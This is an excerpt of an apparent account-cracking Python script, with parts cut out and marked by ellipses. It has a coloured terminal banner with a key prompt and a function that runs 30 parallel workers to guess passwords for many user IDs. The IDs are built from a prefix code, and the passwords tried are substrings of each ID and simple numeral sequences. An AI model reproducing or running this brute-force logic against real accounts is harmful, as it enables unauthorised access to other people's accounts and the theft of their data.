...
\x1b[1;97m┃\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m KEY ━\x1b[38;5;244m➤ \x1b[38;5;81m      \x1b[1;97m┃
\x1b[1;97m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘\033[1;37m""")
#-----------------------[ OLD-CODE ]-----------------------#
def _old_():
       user=[]
...
def BD():
        ...
        with tred(max_workers=30) as crack_submit:
            ...
            for love in user:
                uid = code + love
                passlist = [uid,love,uid[:8],uid[:7],uid[:6],'١٢٣٤٥٦٧٨٩','١٢٣٤٥٦']
